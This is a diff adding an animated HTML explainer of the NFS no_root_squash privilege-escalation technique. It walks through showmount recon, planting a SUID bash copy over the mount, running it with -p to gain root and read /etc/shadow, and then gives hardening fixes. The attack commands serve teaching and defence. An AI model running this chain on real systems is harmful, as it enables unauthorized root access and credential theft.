@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
+<title>NFS no_root_squash Privesc</title>
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{
+  background:#0a0a0f;font-family:'Press Start 2P',monospace;
+  width:100%;height:100vh;overflow:hidden;
+  display:flex;flex-direction:column;align-items:center;color:#fff;
+}
+#app{width:390px;height:100vh;position:relative;overflow:hidden}
+.scene{
+  position:absolute;inset:0;width:390px;height:100vh;
+  display:flex;flex-direction:column;
+  transform:translateX(100%);
+  transition:transform .35s cubic-bezier(.4,0,.2,1);
+  pointer-events:none;
+}
+.scene.active{transform:translateX(0);pointer-events:auto}
+.hdr{height:90px;flex-shrink:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;padding:0 14px;border-bottom:1px solid #2a1f3d}
+.hdr-title{font-size:13px;color:#4ec9e1;text-align:center;letter-spacing:.5px;line-height:1.5}
+.hdr-sub{font-size:9px;color:#666;text-align:center;letter-spacing:1px;line-height:1.5}
+.dots{display:flex;gap:8px}
+.dot{width:11px;height:11px;border-radius:50%;background:#2a1f3d;transition:background .2s}
+.dot.active{background:#4ec9e1}.dot.done{background:#4eff9a}
+.slr{height:28px;flex-shrink:0;display:flex;align-items:center;justify-content:space-between;padding:0 14px}
+.slabel{font-size:9px;letter-spacing:1px}
+.sbadge{font-size:7px;padding:3px 8px;border:1px solid currentColor;border-radius:2px}
+.anim{flex:1;overflow-y:auto;overflow-x:hidden;scrollbar-width:none;-ms-overflow-style:none;min-height:0}
+.anim::-webkit-scrollbar{display:none}
+.info{height:110px;flex-shrink:0;margin:0 12px;border:2px solid #4ec9e1;padding:10px 14px;display:flex;flex-direction:column;justify-content:center;gap:7px;font-size:9px;line-height:1.9}
+.info.am{border-color:#e8a020}.info.rd{border-color:#e85050}.info.gn{border-color:#4eff9a}.info.pu{border-color:#a080ff}
+.il{color:#ccc}.ih{color:#4eff9a}.ih.am{color:#e8a020}.ih.rd{color:#e85050}.ih.pu{color:#a080ff}
+.srow{height:70px;flex-shrink:0;display:flex;gap:8px;padding:8px 12px}
+.sc{flex:1;background:#130d1e;border:1px solid #2a1f3d;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px}
+.sv{font-size:13px;color:#4ec9e1;text-align:center}
+.sv.am{color:#e8a020}.sv.gn{color:#4eff9a}.sv.rd{color:#e85050}.sv.pu{color:#a080ff}
+.sl{font-size:7px;color:#777;text-align:center;line-height:1.4}
+.ctrl{height:60px;flex-shrink:0;display:flex;align-items:center;justify-content:center;gap:10px;padding:0 12px}
+.btn{font-family:'Press Start 2P',monospace;font-size:9px;padding:8px 12px;border:2px solid #4ec9e1;background:transparent;color:#4ec9e1;cursor:pointer;transition:all .15s}
+.btn:hover{background:#4ec9e130}.btn:active{transform:scale(.97)}
+.btn.play{border-color:#4eff9a;color:#4eff9a}.btn.play:hover{background:#4eff9a20}
+.btn:disabled{opacity:.3;cursor:default}
+.btn.restart{border-color:#e85050;color:#e85050}.btn.restart:hover{background:#e8505020}
+.panel{opacity:0;transition:opacity .4s;border-radius:2px}
+.panel.vis{opacity:1}
+.tline{opacity:0;transition:opacity .3s}
+.tline.vis{opacity:1}
+</style>
+</head>
+<body>
+<div id="app">
+
+<!-- ═══════════════════════════════ SCENE 1 ═══════════════════════════════ -->
+<div class="scene active" id="s1" style="background:#000d18">
+  <div class="hdr" style="background:#000d18;border-bottom:1px solid #001830">
+    <div class="hdr-title" style="color:#4ec9e1;font-size:11px;line-height:1.6">NFS EXPOSED</div>
+    <div class="hdr-sub">PORT 2049 + no_root_squash</div>
+    <div class="dots">
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+
+  <div class="slr" style="background:#000d18">
+    <span class="slabel" style="color:#e8a020">RECON</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">CRITICAL</span>
+  </div>
+
+  <div class="anim" style="background:#000d18">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <!-- NFS architecture diagram -->
+      <div style="background:#000508;border:2px solid #001830;border-radius:3px;overflow:hidden">
+        <div style="background:#00040d;padding:5px 10px;border-bottom:1px solid #001830;text-align:center">
+          <span style="font-size:6px;color:#4ec9e1">NFS ARCHITECTURE — PORT 2049</span>
+        </div>
+        <svg width="100%" height="160" viewBox="0 0 366 160" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <filter id="glowC"><feGaussianBlur stdDeviation="2.5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+            <filter id="glowR"><feGaussianBlur stdDeviation="3" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+          </defs>
+
+          <!-- Attacker box -->
+          <rect id="abox" x="6" y="50" width="88" height="60" rx="2" fill="#0a0002" stroke="#e8a020" stroke-width="1.5" opacity="0"/>
+          <text id="aico" x="50" y="74" text-anchor="middle" font-size="16" font-family="monospace" opacity="0">💻</text>
+          <text id="atxt" x="50" y="88" text-anchor="middle" font-size="5.5" fill="#e8a020" font-family="'Press Start 2P',monospace" opacity="0">ATTACKER</text>
+          <text id="auid" x="50" y="101" text-anchor="middle" font-size="5" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">UID=0</text>
+
+          <!-- Arrow right -->
+          <line id="arr1" x1="95" y1="80" x2="175" y2="80" stroke="#e8a020" stroke-width="1.2" stroke-dasharray="4,3" opacity="0"/>
+          <polygon id="arh1" points="179,80 172,76 172,84" fill="#e8a020" opacity="0"/>
+          <text id="artxt" x="137" y="72" text-anchor="middle" font-size="5" fill="#4ec9e1" font-family="'Press Start 2P',monospace" opacity="0">mount</text>
+          <text id="artxt2" x="137" y="82" text-anchor="middle" font-size="5" fill="#4ec9e1" font-family="'Press Start 2P',monospace" opacity="0">NFS :2049</text>
+
+          <!-- NFS Server box -->
+          <rect id="sbox" x="180" y="35" width="100" height="90" rx="2" fill="#000810" stroke="#4ec9e1" stroke-width="2" opacity="0"/>
+          <text id="sico" x="230" y="64" text-anchor="middle" font-size="16" font-family="monospace" opacity="0">🖥</text>
+          <text id="stxt" x="230" y="78" text-anchor="middle" font-size="5.5" fill="#4ec9e1" font-family="'Press Start 2P',monospace" opacity="0">NFS SERVER</text>
+          <text id="sport" x="230" y="91" text-anchor="middle" font-size="5" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">192.168.1.50</text>
+          <text id="sport2" x="230" y="103" text-anchor="middle" font-size="5" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">:2049</text>
+          <text id="sport3" x="230" y="116" text-anchor="middle" font-size="5" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">LINUX / EXT4</text>
+
+          <!-- Export path bubble -->
+          <rect id="expbx" x="288" y="50" width="72" height="40" rx="2" fill="#0a1a00" stroke="#4eff9a" stroke-width="1.2" opacity="0"/>
+          <text id="expt1" x="324" y="65" text-anchor="middle" font-size="5" fill="#4eff9a" font-family="'Press Start 2P',monospace" opacity="0">/srv/nfs</text>
+          <text id="expt2" x="324" y="78" text-anchor="middle" font-size="4.5" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">no_root_squash</text>
+          <line id="expln" x1="280" y1="70" x2="287" y2="70" stroke="#4eff9a" stroke-width="1" opacity="0"/>
+
+          <!-- Packet -->
+          <circle id="pkt1" cx="94" cy="80" r="4" fill="#e8a020" opacity="0" filter="url(#glowC)"/>
+
+          <!-- showmount label below -->
+          <text id="smtxt" x="137" y="145" text-anchor="middle" font-size="5" fill="#e8a020" font-family="'Press Start 2P',monospace" opacity="0">showmount -e reveals all</text>
+        </svg>
+      </div>
+
+      <!-- showmount terminal -->
+      <div id="smterm" class="panel" style="background:#000508;border:2px solid #001830;border-radius:3px;overflow:hidden">
+        <div style="background:#00040d;padding:5px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #001830">
+          <div style="width:7px;height:7px;border-radius:50%;background:#e85050"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#e8a020"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#4eff9a"></div>
+          <div style="flex:1;text-align:center;font-size:6px;color:#555">RECON — showmount</div>
+        </div>
+        <div style="padding:10px 12px;font-size:6.5px;line-height:2.3">
+          <div style="color:#888">$ <span style="color:#4ec9e1">showmount</span> -e 192.168.1.50</div>
+          <div id="sml1" class="tline" style="color:#aaa">Export list for 192.168.1.50:</div>
+          <div id="sml2" class="tline" style="color:#4eff9a">/srv/nfs  *(rw,no_root_squash)</div>
+          <div id="sml3" class="tline" style="color:#e85050">&#35; wildcard (*) = ANY host can mount</div>
+          <div id="sml4" class="tline" style="color:#e85050">&#35; no_root_squash = root stays root</div>
+        </div>
+      </div>
+
+      <!-- /etc/exports explainer -->
+      <div id="expbox" class="panel" style="background:#000d04;border-left:4px solid #e85050;border-top:1px solid #1a0808;border-right:1px solid #1a0808;border-bottom:1px solid #1a0808;padding:10px 12px">
+        <div style="font-size:7px;color:#e85050;margin-bottom:7px">▸ /etc/exports (SERVER CONFIG)</div>
+        <div style="background:#000502;border:1px solid #1a0808;padding:7px 8px;font-size:6.5px;line-height:2.1;margin-bottom:6px">
+          <span style="color:#4eff9a">/srv/nfs</span> <span style="color:#e85050">*(rw,sync,no_subtree_check,<br>&nbsp;&nbsp;no_root_squash)</span>
+        </div>
+        <div style="font-size:6px;color:#888;line-height:1.9">
+          <span style="color:#e8a020">no_root_squash</span> — client UID 0 maps to server UID 0.<br>
+          Default (root_squash) maps root → nobody (UID 65534).<br>
+          One option = full privilege escalation path.
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info rd">
+    <div class="il">NFS trusts the client OS to report UIDs — there's no server-side verification.</div>
+    <div class="ih rd">no_root_squash means "trust the client's root" — on a network share.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">2049</div><div class="sl">NFS<br>PORT</div></div>
+    <div class="sc"><div class="sv rd">UID 0</div><div class="sl">CLIENT<br>MAPS TO</div></div>
+    <div class="sc"><div class="sv am">*</div><div class="sl">WILDCARD<br>EXPORT</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" disabled>◀ PREV</button>
+    <button class="btn play" onclick="play(1)">▶ PLAY</button>
+    <button class="btn" onclick="go(2)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════ SCENE 2 ═══════════════════════════════ -->
+<div class="scene" id="s2" style="background:#0a0002">
+  <div class="hdr" style="background:#0a0002;border-bottom:1px solid #2a0010">
+    <div class="hdr-title" style="color:#e85050;font-size:11px;line-height:1.6">SUID PLANT</div>
+    <div class="hdr-sub">COPY BASH + SET SUID BIT VIA NFS</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+
+  <div class="slr" style="background:#0a0002">
+    <span class="slabel" style="color:#e8a020">EXPLOIT CHAIN</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">ATTACK</span>
+  </div>
+
+  <div class="anim" style="background:#0a0002">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <!-- SUID explainer -->
+      <div id="suidbox" class="panel" style="background:#080002;border-left:4px solid #e8a020;border-top:1px solid #1a0808;border-right:1px solid #1a0808;border-bottom:1px solid #1a0808;padding:10px 12px">
+        <div style="font-size:7px;color:#e8a020;margin-bottom:7px">▸ WHAT IS THE SUID BIT?</div>
+        <div style="font-size:6.5px;color:#aaa;line-height:2.1">
+          When a binary has the <span style="color:#e8a020">Set-UID</span> permission bit set,<br>
+          it executes as its <span style="color:#e85050">owner's UID</span> — not the caller's.<br>
+          If owner = root and SUID is set → <span style="color:#e85050">always runs as root</span>,<br>
+          regardless of who launches it.
+        </div>
+      </div>
+
+      <!-- Step 1: Mount -->
+      <div id="mntterm" class="panel" style="background:#050002;border:2px solid #e8a020;border-radius:3px;overflow:hidden">
+        <div style="background:#0d0005;padding:5px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #1a0808">
+          <div style="width:7px;height:7px;border-radius:50%;background:#e85050"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#e8a020"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#4eff9a"></div>
+          <div style="flex:1;text-align:center;font-size:6px;color:#555">STEP 1 — MOUNT AS ROOT (attacker machine)</div>
+        </div>
+        <div style="padding:10px 12px;font-size:6.5px;line-height:2.3">
+          <div style="color:#888">root@attacker:~# <span style="color:#e8a020">mount</span> -t nfs \</div>
+          <div id="ml1" class="tline" style="color:#888">&nbsp;&nbsp;192.168.1.50:/srv/nfs /mnt/nfs</div>
+          <div id="ml2" class="tline" style="color:#4eff9a">&#35; mounted — attacker UID 0 = server UID 0</div>
+        </div>
+      </div>
+
+      <!-- Step 2: Copy bash + chmod +s -->
+      <div id="cpterm" class="panel" style="background:#050002;border:2px solid #e85050;border-radius:3px;overflow:hidden">
+        <div style="background:#0d0005;padding:5px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #1a0808">
+          <div style="width:7px;height:7px;border-radius:50%;background:#e85050"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#e8a020"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#4eff9a"></div>
+          <div style="flex:1;text-align:center;font-size:6px;color:#555">STEP 2 — PLANT SUID BINARY</div>
+        </div>
+        <div style="padding:10px 12px;font-size:6.5px;line-height:2.3">
+          <div id="cl1" class="tline" style="color:#888">root@attacker:~# <span style="color:#e85050">cp</span> /bin/bash /mnt/nfs/rootbash</div>
+          <div id="cl2" class="tline" style="color:#888">root@attacker:~# <span style="color:#e85050">chmod +s</span> /mnt/nfs/rootbash</div>
+          <div id="cl3" class="tline" style="color:#4eff9a">root@attacker:~# ls -la /mnt/nfs/rootbash</div>
+          <div id="cl4" class="tline" style="color:#e85050">-rw<span style="color:#e85050;font-size:8px">s</span>r-<span style="color:#e85050;font-size:8px">s</span>r-x 1 root root ... rootbash</div>
+          <div id="cl5" class="tline" style="color:#e85050">&#35; SUID set — 's' visible in permissions ↑</div>
+        </div>
+      </div>
+
+      <!-- File transfer diagram SVG -->
+      <div id="ftdiag" class="panel" style="background:#000508;border:2px solid #1a0018;border-radius:3px;overflow:hidden">
+        <div style="background:#000308;padding:5px 10px;border-bottom:1px solid #1a0018;text-align:center">
+          <span style="font-size:6px;color:#a080ff">SUID BINARY FLOW</span>
+        </div>
+        <svg width="100%" height="95" viewBox="0 0 366 95" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <filter id="glowS"><feGaussianBlur stdDeviation="2" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+          </defs>
+          <!-- Attacker /bin/bash -->
+          <rect id="f1" x="8" y="20" width="82" height="36" rx="2" fill="#0a0002" stroke="#e8a020" stroke-width="1.2" opacity="0"/>
+          <text id="f1t" x="49" y="34" text-anchor="middle" font-size="5.5" fill="#e8a020" font-family="'Press Start 2P',monospace" opacity="0">/bin/bash</text>
+          <text id="f1t2" x="49" y="47" text-anchor="middle" font-size="5" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">attacker</text>
+
+          <!-- Arrow -->
+          <line id="fa" x1="92" y1="38" x2="155" y2="38" stroke="#e85050" stroke-width="1.5" stroke-dasharray="4,3" opacity="0"/>
+          <polygon id="fah" points="159,38 152,34 152,42" fill="#e85050" opacity="0"/>
+          <text id="fatxt" x="125" y="29" text-anchor="middle" font-size="5" fill="#a080ff" font-family="'Press Start 2P',monospace" opacity="0">cp + chmod +s</text>
+          <text id="fatxt2" x="125" y="40" text-anchor="middle" font-size="5" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">via NFS mount</text>
+
+          <!-- NFS share rootbash -->
+          <rect id="f2" x="160" y="15" width="98" height="46" rx="2" fill="#0a0002" stroke="#e85050" stroke-width="2" opacity="0"/>
+          <text id="f2t" x="209" y="32" text-anchor="middle" font-size="5.5" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">/srv/nfs/rootbash</text>
+          <text id="f2t2" x="209" y="45" text-anchor="middle" font-size="5.5" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">-rwsr-sr-x root</text>
+          <text id="f2t3" x="209" y="55" text-anchor="middle" font-size="4.5" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">NFS server disk</text>
+
+          <!-- Arrow to victim -->
+          <line id="fa2" x1="260" y1="38" x2="320" y2="38" stroke="#4eff9a" stroke-width="1.5" stroke-dasharray="4,3" opacity="0"/>
+          <polygon id="fah2" points="324,38 317,34 317,42" fill="#4eff9a" opacity="0"/>
+
+          <!-- Victim sees SUID file -->
+          <rect id="f3" x="326" y="20" width="36" height="36" rx="2" fill="#001008" stroke="#4eff9a" stroke-width="1.2" opacity="0"/>
+          <text id="f3t" x="344" y="34" text-anchor="middle" font-size="9" font-family="monospace" opacity="0">🖥</text>
+          <text id="f3t2" x="344" y="49" text-anchor="middle" font-size="4.5" fill="#4eff9a" font-family="'Press Start 2P',monospace" opacity="0">victim</text>
+
+          <!-- Packet -->
+          <circle id="fpkt" cx="90" cy="38" r="4" fill="#e85050" opacity="0" filter="url(#glowS)"/>
+        </svg>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info rd">
+    <div class="il">The NFS server sees write as root (UID 0) — so chmod +s succeeds on the share.</div>
+    <div class="ih rd">The SUID binary now lives on the server's disk, owned by root, executable by anyone.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">+s</div><div class="sl">SUID<br>BIT SET</div></div>
+    <div class="sc"><div class="sv rd">root</div><div class="sl">FILE<br>OWNER</div></div>
+    <div class="sc"><div class="sv am">2</div><div class="sl">COMMANDS<br>NEEDED</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(1)">◀ PREV</button>
+    <button class="btn play" onclick="play(2)">▶ PLAY</button>
+    <button class="btn" onclick="go(3)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════ SCENE 3 ═══════════════════════════════ -->
+<div class="scene" id="s3" style="background:#060010">
+  <div class="hdr" style="background:#060010;border-bottom:1px solid #1a0838">
+    <div class="hdr-title" style="color:#a080ff;font-size:11px;line-height:1.6">PRIVESC CONFIRMED</div>
+    <div class="hdr-sub">VICTIM RUNS SUID → EUID=0</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+
+  <div class="slr" style="background:#060010">
+    <span class="slabel" style="color:#e85050">PRIVILEGE ESC</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">OWNED</span>
+  </div>
+
+  <div class="anim" style="background:#060010">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <!-- Victim terminal -->
+      <div id="victerm" class="panel" style="background:#040008;border:2px solid #a080ff;border-radius:3px;overflow:hidden">
+        <div style="background:#08000f;padding:5px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #1a0838">
+          <div style="width:7px;height:7px;border-radius:50%;background:#e85050"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#e8a020"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#4eff9a"></div>
+          <div style="flex:1;text-align:center;font-size:6px;color:#555">VICTIM SHELL (low-priv user)</div>
+        </div>
+        <div style="padding:10px 12px;font-size:6.5px;line-height:2.3">
+          <div id="vl1" class="tline" style="color:#888">user@victim:~$ <span style="color:#aaa">id</span></div>
+          <div id="vl2" class="tline" style="color:#aaa">uid=1001(user) gid=1001(user) groups=1001</div>
+          <div id="vl3" class="tline" style="color:#888">user@victim:~$ <span style="color:#a080ff">ls -la /srv/nfs/rootbash</span></div>
+          <div id="vl4" class="tline" style="color:#e85050">-rw<span style="font-size:8px">s</span>r-<span style="font-size:8px">s</span>r-x 1 <span style="color:#e85050">root root</span> ... rootbash</div>
+          <div id="vl5" class="tline" style="color:#888">user@victim:~$ <span style="color:#e85050">/srv/nfs/rootbash -p</span></div>
+          <div id="vl6" class="tline" style="color:#555">&#35; -p flag preserves EUID (bash drops privs without it)</div>
+        </div>
+      </div>
+
+      <!-- Root shell confirmation -->
+      <div id="rootterm" class="panel" style="background:#040008;border:2px solid #e85050;border-radius:3px;overflow:hidden">
+        <div style="background:#0d0002;padding:5px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #1a0808">
+          <div style="width:7px;height:7px;border-radius:50%;background:#e85050"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#e8a020"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#4eff9a"></div>
+          <div style="flex:1;text-align:center;font-size:6px;color:#555">ROOT SHELL — PRIVESC COMPLETE</div>
+        </div>
+        <div style="padding:10px 12px;font-size:6.5px;line-height:2.3">
+          <div id="rl1" class="tline" style="color:#888">rootbash-5.1# <span style="color:#4eff9a">id</span></div>
+          <div id="rl2" class="tline" style="color:#e85050;font-size:9px">uid=1001(user) <span style="color:#e85050">euid=0(root)</span></div>
+          <div id="rl3" class="tline" style="color:#888">rootbash-5.1# <span style="color:#4eff9a">whoami</span></div>
+          <div id="rl4" class="tline" style="color:#e85050;font-size:11px">root</div>
+          <div id="rl5" class="tline" style="color:#888">rootbash-5.1# <span style="color:#4eff9a">cat /etc/shadow</span></div>
+          <div id="rl6" class="tline" style="color:#e85050">root:$6$Kd8...:19821:0:99999:7:::</div>
+          <div id="rl7" class="tline" style="color:#555">&#35; /etc/shadow readable — full compromise</div>
+        </div>
+      </div>
+
+      <!-- UID diagram -->
+      <div id="uiddiag" class="panel" style="background:#000508;border:2px solid #1a0838;border-radius:3px;overflow:hidden">
+        <div style="background:#00040d;padding:5px 10px;border-bottom:1px solid #1a0838;text-align:center">
+          <span style="font-size:6px;color:#a080ff">UID vs EUID — WHY -p MATTERS</span>
+        </div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:0">
+          <div style="padding:8px 10px;border-right:1px solid #1a0838">
+            <div style="font-size:6px;color:#e85050;margin-bottom:5px">WITHOUT -p</div>
+            <div style="font-size:5.5px;color:#aaa;line-height:2.0">
+              bash drops EUID<br>
+              back to real UID<br>
+              <span style="color:#555">→ stays unprivileged</span>
+            </div>
+          </div>
+          <div style="padding:8px 10px">
+            <div style="font-size:6px;color:#4eff9a;margin-bottom:5px">WITH -p (preserve)</div>
+            <div style="font-size:5.5px;color:#aaa;line-height:2.0">
+              bash keeps EUID=0<br>
+              from SUID owner<br>
+              <span style="color:#e85050">→ root shell ✓</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info pu">
+    <div class="il">EUID (effective UID) is what the kernel uses for permission checks — not real UID.</div>
+    <div class="ih pu">SUID + no_root_squash + -p flag = any local user becomes root. No password.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">EUID=0</div><div class="sl">EFFECTIVE<br>USER</div></div>
+    <div class="sc"><div class="sv rd">LOCAL</div><div class="sl">ACCESS<br>NEEDED</div></div>
+    <div class="sc"><div class="sv am">1</div><div class="sl">CMD TO<br>ESCALATE</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(2)">◀ PREV</button>
+    <button class="btn play" onclick="play(3)">▶ PLAY</button>
+    <button class="btn" onclick="go(4)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════ SCENE 4 ═══════════════════════════════ -->
+<div class="scene" id="s4" style="background:#001208">
+  <div class="hdr" style="background:#001208;border-bottom:1px solid #003818">
+    <div class="hdr-title" style="color:#4eff9a;font-size:11px;line-height:1.6">HARDENING</div>
+    <div class="hdr-sub">4 CONTROLS THAT STOP THIS ATTACK</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+    </div>
+  </div>
+
+  <div class="slr" style="background:#001208">
+    <span class="slabel" style="color:#4eff9a">DEFENCE</span>
+    <span class="sbadge" style="color:#4eff9a;border-color:#4eff9a">FIX NOW</span>
+  </div>
+
+  <div class="anim" style="background:#001208">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <!-- Safe vs unsafe /etc/exports comparison -->
+      <div id="cmpbox" class="panel" style="padding:0;display:grid;grid-template-columns:1fr 1fr;gap:8px">
+        <div style="background:#120000;border:2px solid #e85050;border-radius:2px;overflow:hidden">
+          <div style="background:#1a0000;padding:5px 7px;border-bottom:1px solid #3a1010;text-align:center">
+            <div style="font-size:6px;color:#e85050">✗ DANGEROUS</div>
+          </div>
+          <div style="padding:8px 7px;font-size:5.5px;line-height:2.2;color:#888">
+            /srv/nfs *(rw,<br>
+            <span style="color:#e85050">no_root_squash</span>)
+          </div>
+        </div>
+        <div style="background:#001508;border:2px solid #4eff9a;border-radius:2px;overflow:hidden">
+          <div style="background:#001a08;padding:5px 7px;border-bottom:1px solid #0d3018;text-align:center">
+            <div style="font-size:6px;color:#4eff9a">✓ SAFE</div>
+          </div>
+          <div style="padding:8px 7px;font-size:5.5px;line-height:2.2;color:#888">
+            /srv/nfs<br>
+            192.168.1.0/24(ro,<br>
+            <span style="color:#4eff9a">root_squash</span>,<br>
+            nosuid)
+          </div>
+        </div>
+      </div>
+
+      <!-- Fix 1: root_squash -->
+      <div id="fix1" class="panel" style="background:#000d04;border-left:4px solid #4eff9a;border-top:1px solid #0a2010;border-right:1px solid #0a2010;border-bottom:1px solid #0a2010;padding:10px 12px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:7px">
+          <span style="font-size:13px">👤</span>
+          <span style="font-size:7px;color:#4eff9a">FIX 1 — use root_squash (default)</span>
+        </div>
+        <div style="background:#000802;border:1px solid #0a2008;padding:7px 8px;font-size:6.5px;color:#4eff9a;line-height:2.0;margin-bottom:5px">
+          /srv/nfs 192.168.1.0/24(<span style="color:#4eff9a">root_squash</span>,rw)<br>
+          <span style="color:#555"># UID 0 → mapped to nobody (65534)</span>
+        </div>
+        <div style="font-size:6px;color:#888;line-height:1.8">root_squash is the default — only set no_root_squash when explicitly required, and never on world-accessible exports.</div>
+      </div>
+
+      <!-- Fix 2: restrict by IP -->
+      <div id="fix2" class="panel" style="background:#000d04;border-left:4px solid #4ec9e1;border-top:1px solid #0a2010;border-right:1px solid #0a2010;border-bottom:1px solid #0a2010;padding:10px 12px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:7px">
+          <span style="font-size:13px">🌐</span>
+          <span style="font-size:7px;color:#4ec9e1">FIX 2 — restrict exports to specific IPs</span>
+        </div>
+        <div style="background:#000802;border:1px solid #0a2008;padding:7px 8px;font-size:6.5px;color:#4eff9a;line-height:2.0;margin-bottom:5px">
+          <span style="color:#555"># replace * wildcard with subnet/IP</span><br>
+          /srv/nfs <span style="color:#4ec9e1">192.168.1.10</span>(rw,root_squash)
+        </div>
+        <div style="font-size:6px;color:#888;line-height:1.8">Wildcard * lets any host on any network mount. Even with root_squash, data exposure risk remains. Limit to known IPs and firewall port 2049.</div>
+      </div>
+
+      <!-- Fix 3: nosuid mount option -->
+      <div id="fix3" class="panel" style="background:#000d04;border-left:4px solid #a080ff;border-top:1px solid #0a2010;border-right:1px solid #0a2010;border-bottom:1px solid #0a2010;padding:10px 12px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:7px">
+          <span style="font-size:13px">🚫</span>
+          <span style="font-size:7px;color:#a080ff">FIX 3 — nosuid on client mount</span>
+        </div>
+        <div style="background:#000802;border:1px solid #0a2008;padding:7px 8px;font-size:6.5px;color:#4eff9a;line-height:2.0;margin-bottom:5px">
+          <span style="color:#555"># /etc/fstab on client</span><br>
+          server:/share /mnt nfs \<br>
+          &nbsp;&nbsp;<span style="color:#a080ff">nosuid</span>,noexec,ro 0 0
+        </div>
+        <div style="font-size:6px;color:#888;line-height:1.8">nosuid makes the kernel ignore SUID bits on the mounted filesystem. noexec prevents running binaries at all. Defense in depth on the client side.</div>
+      </div>
+
+      <!-- Fix 4: NFSv4 + Kerberos -->
+      <div id="fix4" class="panel" style="background:#000d04;border-left:4px solid #e8a020;border-top:1px solid #0a2010;border-right:1px solid #0a2010;border-bottom:1px solid #0a2010;padding:10px 12px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:7px">
+          <span style="font-size:13px">🔐</span>
+          <span style="font-size:7px;color:#e8a020">FIX 4 — NFSv4 + Kerberos (krb5)</span>
+        </div>
+        <div style="background:#000802;border:1px solid #0a2008;padding:7px 8px;font-size:6.5px;color:#4eff9a;line-height:2.0;margin-bottom:5px">
+          <span style="color:#555"># /etc/exports with sec= option</span><br>
+          /srv/nfs *(rw,root_squash,<span style="color:#e8a020">sec=krb5p</span>)<br>
+          <span style="color:#555"># krb5p = authenticate + encrypt</span>
+        </div>
+        <div style="font-size:6px;color:#888;line-height:1.8">NFSv4 with Kerberos authenticates the user identity cryptographically — the server no longer trusts the client's claimed UID. krb5p also encrypts data in transit.</div>
+      </div>
+
+      <!-- Control summary bar chart -->
+      <div id="sumbox" class="panel" style="background:#000810;border:2px solid #0a2010;border-radius:3px;overflow:hidden">
+        <div style="background:#00050d;padding:5px 10px;border-bottom:1px solid #0a2008;text-align:center">
+          <span style="font-size:6px;color:#4eff9a">CONTROL EFFECTIVENESS vs THIS ATTACK</span>
+        </div>
